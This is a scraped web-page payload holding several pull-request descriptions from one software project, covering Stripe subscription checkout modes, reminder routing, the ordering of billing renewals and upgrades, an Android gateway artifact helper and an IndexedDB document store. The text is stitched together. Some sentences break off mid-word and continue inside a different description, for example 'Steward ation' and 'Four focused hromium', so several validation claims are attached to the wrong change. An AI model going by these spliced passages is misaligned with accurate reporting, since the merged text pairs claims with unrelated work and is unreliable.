exact test file. Local full-range secret scan is clean. Hosted checks are rerunning on the new head. No live Stripe or device acceptance is claimed.\n"])</script><script>self.__next_f.push([1,"63:T447,Personal reminders could fall through to a generic trigger even after the owner reminder tool was admitted. A missing-schedule rejection could then remain authoritative after a corrected creation committed, producing a false failure reply. Scheduled dashboard replies also had two persistence owners, creating duplicate message rows.\n\nKeep admitted owner reminder routes exclusive for a single reminder intent, mark the precise missing-schedule validation as a retryable pre-write rejection, and explicitly hand canonical simple-response persistence to the message processor. Existing admission, compound-request, failure, receipt, and persistence-error guards remain in place.\n\nValidation: 134 focused checks passed on current develop: owner routing, real PGlite schedule/recovery, dashboard sender, and trigger/message-processor delivery. Biome passed on all 11 changed files. Broad compilation was not rerun; the earlier owning agent typecheck exhausted its V8 heap.\n\nNative OS heads-up presentation remains a separate known issue; this change does not establish full notification readiness.\n64:Tddb,"])</script><script>self.__next_f.push([1,"## Summary\n\nLets a native/local app sell the existing Plus ($30) / Pro ($100) monthly Cloud subscription with an in-app Stripe form, plus a \"someone else will pay\" link. Hosted checkout is unchanged and remains the default.\n\n`POST /api/v1/subscriptions/checkout` (billing-manager Steward session, unchanged auth) accepts an optional `presentation`:\n\n| presentation | Stripe session | `open` response adds |\n|---|---|---|\n| `hosted` (default) | unchanged | nothing (`{status, commandId, checkoutUrl}`) |\n| `embedded` | `ui_mode: \"embedded\"`, card only, `redirect_on_completion: \"never\"`, no return URLs | `presentation, checkoutUrl: null, sessionId, uiMode: \"embedded\", clientSecret, publishableKey, amountDueCents, currency: \"usd\", interval: \"month\", expiresAt` |\n| `shared` | hosted; success/cancel go to a new public fixed-copy page `GET /api/v1/subscriptions/checkout/payer?outcome=paid\\|canceled` on the API origin | `presentation, checkoutUrl, expiresAt` |\n\n- The presentation is part of the persisted, digest-bound checkout contract. It is absent for hosted, so stored contracts and hosted request digests are byte-identical.\n- An idempotency key is bound to its presentation. Reusing it for another presentation returns `409 billing_state_conflict`.\n- One pending checkout per org still holds. If the plan or the presentation changes, the server first expires the previous unpaid session (`CHECKOUT_SUPERSEDED_BY_PRESENTATION_CHANGE`), then creates the new one. It never starts a second purchase after the earlier session completed. A retry with the superseded key returns `expired`.\n- Entitlement still comes only from the webhook or `checkout/confirm` (`{sessionId}`). Retrying the same key also reports `completed` once payment is verified.\n- The payer page reads no state and echoes no input. It is public only for GET/HEAD of that exact path, and is served with `no-store`, a strict CSP and `no-referrer`.\n- New env `STRIPE_PUBLISHABLE_KEY` (documented in wrangler.toml, worker env type, `.env.example`). It must be `pk_live_` in production and `pk_test_` elsewhere, and match `STRIPE_SECRET_KEY`'s mode. If it doesn't, embedded checkout returns 503 before any provider write.\n\n### Why `embedded` rather than the in-page Elements mode\nThe Stripe API version is pinned to `2024-11-20.acacia`. In that version, `ui_mode: \"custom\"` is still a beta that needs a beta header, and `\"elements\"` only exists from `2026-03-25.dahlia`. Bumping the pinned version for all billing reads is out of scope. Embedded Checkout with `redirect_on_completion: \"never\"` is GA in acacia. The client gets `uiMode` explicitly and should use `createEmbeddedCheckoutPage` / `initEmbeddedCheckout`.\n\n### Known trade-off\nA shared-link payer pays as the org's Stripe customer, so hosted Checkout may show the org's billing email.\n\n## Tests\n- `shared`: `subscription-checkout-recovery.pglite.test.ts` passes 18/18 (6 new tests: embedded shape and create params, publishable-key fail-closed with no provider write, shared return URLs, embedded→shared→hosted supersession and idempotency, completed-session protection, contract validation). All `src/**/*subscription*` pglite/unit suites pass.\n- `api`: new `payer/route.test.ts`; `stripe-event-checkout-authority` 7/7; router contract check passes.\n- `tsc --noEmit` passes for shared, api and sdk; biome is clean on changed files.\n\nNot done: no live Stripe, staging or device acceptance. Deploy needs `STRIPE_PUBLISHABLE_KEY` set per environment.\n\n🤖 Generated with [Claude Code](https://claude.com/claude-code)"])</script><script>self.__next_f.push([1,"65:Ta6a,"])</script><script>self.__next_f.push([1,"## Summary\n\nBuilds on the native-host enrollment module from #33248 (now merged). Companion to #33259, which adds the in-app/shared subscription checkout.\n\nThis keeps the app-bound `eliza_mobile_…` credential inference-only. Billing routes (`requireCurrentBillingManagerSession`) reject `eliza_` keys, so this gives the trusted native host an interactive Steward ation still resolves original upgrades, rereads source authority, and retains the transaction-level unsettled-command fence. Existing actor/organization/source, paid-object and lease authorities are preserved; no new provider mutation or dispatch is introduced.\n\nCurrent repair validation: an isolated native PostgreSQL 16.15 case passed (five assertions), covering a paid renewal followed by a later correctly reviewed/admitted pending upgrade, then replay of the original applied renewal without extra dispatch or allowance publication. The same controlled case fails on the original ordering with `original_upgrade_unsettled`. Changed-file owning Biome passes. Fixtures contain controlled provider objects; no live Stripe, money, organization or foreign tenant mutation is claimed. Current-head shared/API typechecks, complete database suite, root full verification and hosted checks remain pending; retain draft until required gates pass. Previous validation below applies to the previous author head and is not automatically carried forward.\n\nA renewal delivered before a lost-response upgrade was settled could capture the old plan and advance the source past the original upgrade. Renewal handling now recovers unresolved, already-started upgrades first, then re-reads the plan and revision before retrieving renewal authority. Pending original payment remains retryable.\n\nThe shared paid-renewal publisher checks for unresolved started upgrades under the organization lock, protecting both webhook publication and missed-event reconciliation against a race after the initial read. Existing invoice replay remains idempotent. An upgrade that never started does not block renewal; its later stale dispatch is rejected before a provider mutation.\n\nValidation at e1c0e195b73eb8c3a88506b04244b6907b7c7f6c: 50 real PostgreSQL cases / 271 assertions, 57 PGlite component cases / 320 assertions, shared typecheck, API build and Biome pass. Coverage crosses the original period boundary, recovers the original paid upgrade, expires its allowance, grants the new Pro period once, and replays without replenishment. Direct webhook and missed-event finalization both reject a still-unresolved upgrade. Full local root verification passes at the same head: 298 workspace tasks, packed-package checks and final repository audits.\n\nDepends on #33579. This is internal billing ordering, not public upgrade UI or production-provider qualification. Subscription-event capture, advanced-source disposition, expired/void outcomes, public upgrade confirmation/status, scheduled downgrade and Senior Care adoption remain separate requirements. Tenant, source-revision, lease, payment and entitlement checks remain enforced.\n"])</script><script>self.__next_f.push([1,"7a:Tae0,"])</script><script>self.__next_f.push([1,"Embedded Android gateway hosts duplicate source copying, task/DNS output hashing and stale-artifact checks. Move those mechanics into `native-host/gateway-artifact` in the native-agent plugin. The existing native-host export publishes it without a renderer bridge.\n\nHosts select product/upstream files, DNS dependencies, trusted source/output directories, compiler environment and synchronous task-builder callback. They retain source pinning, serialized staging and provenance publication. The helper preserves the existing gateway layout and hash keys, including rejection of internally consistent but stale source, changed staged dependencies and altered generated output. Staging is not atomic: a failed generator/compiler can leave partial files, which must be verified before packaging or use.\n\n[Senior Care PR #7](https://github.com/eliza-research/senior-care/pull/7), committed caller `6f579852`, consumes the accepted helper directly from reviewed pin `78620a847b657106d30c6064779b24abd306ebfb`. The temporary patch, manifest and source stager are removed. Product file selections, reviewed-source checks and provenance writing remain local.\n\nValidation:\n- Four focused hromium, Firefox and WebKit with 200 retained cross-tab edits and unique receipts per engine, failed-write recovery, stale/reset receipts, tab closure, reload and cancellation. The frozen install changes no dependencies. This resident head passes full `bun run verify`: all 298 tasks and final audits, including the alias guard against the explicit resident base.\n\nAlpha's consumer migration is separate and not yet complete. This backport does not switch its storage or claim that the original Calendar regression is fixed. No Android build or physical-device acceptance is claimed.\n7d:T4e4,Admit the reviewed BrowserDocumentStore from #33568 into the source branch consumed by Alpha Phone. This ports only the shared IndexedDB document helper, public export, real-browser harness and its bounded cancellation follow-up; no product storage is migrated by this PR.\n\nThe helper uses transaction receipts and compare-and-swap instead of treating localStorage snapshots plus Web Locks as transactional storage. Hosts retain namespace, schema, legacy import, notifications and recovery ownership.\n\nValidation on this source:\n- UI typecheck and changed-source Biome checks pass.\n- The upstream browser harness passes Chromium and Firefox with the locally installed Playwright 1.62.1 browser engines: 200 concurrent updates each, unique receipts, competing creation, reset ABA, exact corrupt bytes, failed edits/transactions, hanging-editor cancellation, late results, tab closure and reload.\n- Full root verification passes: 298 tasks plus final repository audits.\n\nThe producer PR independently records pinned Chromium/Firefox/WebKit coverage. This local staging run does not claim WebKit qualification: its downloaded fallback requires unavailable host ICU/XML/flite libraries. Alpha consumer migration and APK qualification remain separate work.\n7e:T65c,"])</script><script>self.__next_f.push([1,"Concurrent browser tabs can lose localStorage updates despite Web Locks because lock ownersh
